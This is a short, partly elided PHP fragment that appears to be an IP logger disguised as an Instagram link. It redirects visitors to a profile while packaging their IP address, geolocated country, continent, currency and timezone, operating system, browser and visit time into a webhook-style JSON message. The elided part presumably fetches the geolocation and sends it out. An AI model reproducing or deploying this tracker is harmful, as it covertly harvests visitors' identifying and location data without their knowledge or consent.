<?php
header( 'Location: https://www.instagram.com/_madsravn/?hl=da' ) ;
...
$make_json = json_encode(array('content'=>"Ham den sejes Insta  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
